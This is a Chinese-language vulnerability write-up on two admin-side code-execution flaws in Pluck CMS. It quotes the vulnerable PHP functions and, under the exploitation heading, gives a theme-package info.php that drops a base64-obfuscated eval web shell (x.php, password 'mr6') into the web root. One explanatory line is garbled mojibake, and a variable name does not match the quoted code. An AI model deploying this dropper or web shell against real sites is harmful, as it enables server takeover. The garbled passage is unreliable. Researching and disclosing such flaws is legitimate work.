# Pluck CMS后台另两处任意代码执行


<meta name="referrer" content="no-referrer" />

## 前言

本来是在cnvd上看到了有人发Pluck CMS的洞，但是没有公开细节，便想着自己挖一下。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414013-1ccfc948-88c7-4562-96d6-f1b73cdb23e4.png)

但是审完第一个后发现已经有两位同学写出来了

[Pluck CMS 4.7.10远程代码执行漏洞分析](https://xz.aliyun.com/t/6486)

[Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell代码分析](https://xz.aliyun.com/t/6543)

当时自己的思路跟第一个同学一样，第二个同学的思路自己确实没有想到，佩服佩服。

但是心有不甘，自己就继续挖掘了一下，又发现了两处可以任意命令执行的地方。

## 正文

### 第一处：过滤不严导致单引号逃逸

这个跟第一篇思路一样，只不过找到了另一处未过滤的点

在`function.php`里面`blog_save_post()`函数

```
function blog_save_post($title, $category, $content, $current_seoname = null, $force_time = null) {
	//Check if 'posts' directory exists, if not; create it.
	if (!is_dir(BLOG_POSTS_DIR)) {
		mkdir(BLOG_POSTS_DIR);
		chmod(BLOG_POSTS_DIR, 0777);
	}
	//Create seo-filename
	$seoname = seo_url($title);
	//Sanitize variables.
	$title = sanitize($title, true);
	$content = sanitizePageContent($content, false);
	if (!empty($current_seoname)) {
		$current_filename = blog_get_post_filename($current_seoname);
		$parts = explode('.', $current_filename);
		$number = $parts[0];
		//Get the post time.
		include BLOG_POSTS_DIR.'/'.$current_filename;
		if ($seoname != $current_seoname) {
			unlink(BLOG_POSTS_DIR.'/'.$current_filename);
			if (is_dir(BLOG_POSTS_DIR.'/'.$current_seoname))
				rename(BLOG_POSTS_DIR.'/'.$current_seoname, BLOG_POSTS_DIR.'/'.$seoname);
		}
	}
	else {
		$files = read_dir_contents(BLOG_POSTS_DIR, 'files');
		//Find the number.
		if ($files) {
			$number = count($files);
			$number++;
		}
		else
			$number = 1;
		if (empty($force_time))
			$post_time = time();
		else
			$post_time = $force_time;
	}
	//Save information.
	$data['post_title']    = $title;
	$data['post_category'] = $category;
	$data['post_content']  = $content;
	$data['post_time']     = $post_time;
	save_file(BLOG_POSTS_DIR.'/'.$number.'.'.$seoname.'.php', $data);
	//Return seoname under which post has been saved (to allow for redirect).
	return $seoname;
}
```

其中

```
$data['post_title']    = $title;
	$data['post_category'] = $category;
	$data['post_content']  = $content;
	$data['post_time']     = $post_time;
```

$title  content åè¢«è¿æ»¤ï¼post_time不可控，$category可控

所以只要把$cont2变成我们的payload即可

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414122-82d3a774-b95d-48d3-be5d-706ed8fd141d.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414238-be9dab3c-57bd-49b6-a4f0-486c36e7d6ef.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414333-e34949fc-0b34-4477-b8a0-c6ba56824748.png)

### 第二处：安装模版+文件包含导致任意命令执行

很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。

#### 直接访问失败

首先准备一个`shell.php`里面是我们的`phpinfo();`

然后打包成`shell.zip`，直接上传主题

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414431-f2b003ff-fe03-4675-8e8f-33d89779d2db.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414523-9fc966fe-81c9-4807-a3b0-951d6453df12.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414611-9cb08d85-6d75-4c58-b89c-e842984cbac1.png)

发现确实上传并且解压成功

但是由于目录下有`.htaccess`文件，直接把php设置为不可解析，所以无法直接访问

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414705-e816307a-f173-4b0b-ad2e-7a4ce6c60aa7.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414804-4eef60e4-823c-46c7-bd09-8d077a272464.png)

#### 文件包含突破

所以就想到需要找一个位置对其进行包含，来达到执行的目的。

首先看到`admin.php`中关于`theme`的部分

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414892-54b2c30f-68a3-49f9-8839-01057772b313.png)

跟进 `data/inc/theme.php`，发现调用了`get_themes()`方法

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900414978-5c97b98e-4d6d-4c05-843b-db94db1b5d8b.png)

跟进 `functions.all.php`，查看`get_themes()`方法

```
function get_themes() {
	$dirs = read_dir_contents('data/themes', 'dirs');
	if ($dirs) {
		natcasesort($dirs);
		foreach ($dirs as $dir) {
			if (file_exists('data/themes/'.$dir.'/info.php')) {
				include_once ('data/themes/'.$dir.'/info.php');
				$themes[] = array(
					'title'   => $themename,
					'dir' => $dir
				);
			}
		}
		return $themes;
	}
	else
		return false;
}
```

发现会遍历`data/themes/`下所有主题目录，并且包含他的`info.php`文件

此时`info.php`可控，就导致了任意代码执行。

#### 利用方法

首先准备一个`info.php`

```
<?php
file_put_contents('x.php',base64_decode('PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg=='));
?>
```

然后打包压缩成`shell.zip`

上传安装主题，然后点击回到主题页，此时触发文件包含。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415074-9446a557-1805-4658-97b9-ff4f79cdc0fd.png)

然后根目录下就会生成我们的一句话x.php，密码是mr6

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415156-8a08993d-6b4f-44c1-bbf4-54c85d5b6927.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900415236-098a16ae-69aa-4012-8849-f0dace1f728c.png)

## 最后

**本人水平有限，文笔较差，如果有什么写的不对的地方还希望大家能够不吝赐教**



